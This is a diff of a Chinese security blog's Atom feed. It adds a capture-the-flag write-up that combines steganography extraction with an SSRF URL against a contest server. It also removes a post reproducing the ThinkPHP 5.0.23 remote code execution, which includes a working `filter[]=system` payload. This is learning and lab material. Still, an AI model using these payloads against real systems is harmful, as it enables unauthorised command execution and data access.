@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chinaran0.github.io/</id>
     <title>冄老狗</title>
-    <updated>2022-04-01T09:19:20.610Z</updated>
+    <updated>2022-04-25T02:25:52.719Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chinaran0.github.io/"/>
     <link rel="self" href="https://chinaran0.github.io/atom.xml"/>
@@ -11,6 +11,32 @@
     <logo>https://chinaran0.github.io/images/avatar.png</logo>
     <icon>https://chinaran0.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 冄老狗</rights>
+    <entry>
+        <title type="html"><![CDATA[[T-Star高校挑战赛]第六题]]></title>
+        <id>https://chinaran0.github.io/post/t-star-gao-xiao-tiao-zhan-sai-di-liu-ti/</id>
+        <link href="https://chinaran0.github.io/post/t-star-gao-xiao-tiao-zhan-sai-di-liu-ti/">
+        </link>
+        <updated>2022-04-25T02:02:27.000Z</updated>
+        <content type="html"><![CDATA[<p>下载得到guess</p>
+<p>file guess 得到他的格式是word，然后打开，显示隐藏内容，得到：<br>
+<img src="https://chinaran0.github.io//post-images/1650852591161.png" alt="" loading="lazy"></p>
+<p>然后binwalk 出来一张图片<br>
+<img src="https://chinaran0.github.io//post-images/1650852646624.jpg" alt="" loading="lazy"><br>
+不用想，肯定是隐写<br>
+跟据题目guess和已知密钥123456<br>
+有一个图片隐写是outguess，<br>
+git clone https://github.com/crorvick/outguess<br>
+自行下载编译安装<br>
+然后解<br>
+outguess -k 123456 -r image1.jpg text.txt<br>
+<img src="https://chinaran0.github.io//post-images/1650853102641.png" alt="" loading="lazy"></p>
+<p>然后给他拼接起来得到一个新的地址：<br>
+http://175.178.148.197/062ycz7s9458b772e91/webs/<br>
+<img src="https://chinaran0.github.io//post-images/1650853266630.png" alt="" loading="lazy"></p>
+<p>后来我就没继续做，一直没找到flag，后来赛后师傅们写出来文章，md,我差一点就拿到flag了<br>
+flag地址：http://175.178.148.197/062ycz7s9458b772e91/webs/index.php?url=http://127.0.0.2/062ycz7s9458b772e91/webs/flag.php</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[python脚本] EXPSearch一键搜索EXP/POC]]></title>
         <id>https://chinaran0.github.io/post/python-jiao-ben-expsearch-yi-jian-sou-suo-exppoc/</id>
@@ -149,23 +175,6 @@ https://github.com/shakeman8/Spring-Core-RCE</p>
 <p>“如果起风了，就乘着风回家；如果下雨了，就顺着雨水、顺着江河湖泊回家；如果是父母来接了，请一定要抓紧他们的衣袖，就像小时候一样，一定不要走丢了，知道吗？”</p>
 <pre><code>     愿逝者安息 ，生者坚强！
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[ThinkPHP 5.0.23RCE[复现-脚本]]]></title>
-        <id>https://chinaran0.github.io/post/thinkphp-5023rcefu-xian-jiao-ben/</id>
-        <link href="https://chinaran0.github.io/post/thinkphp-5023rcefu-xian-jiao-ben/">
-        </link>
-        <updated>2022-03-25T02:09:39.000Z</updated>
-        <content type="html"><![CDATA[<p>启动靶场<br>
-<img src="https://chinaran0.github.io//post-images/1648174262632.png" alt="" loading="lazy"></p>
-<p>payload：<br>
-_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]={systeam}</p>
-<figure data-type="image" tabindex="1"><img src="https://chinaran0.github.io//post-images/1648174566443.png" alt="" loading="lazy"></figure>
-<p>写个脚本:<br>
-<img src="https://chinaran0.github.io//post-images/1648174626940.png" alt="" loading="lazy"><br>
-脚本地址：<br>
-https://github.com/ChinaRan0/ThinkPHP5.0.23RCE</p>
 ]]></content>
     </entry>
 </feed>
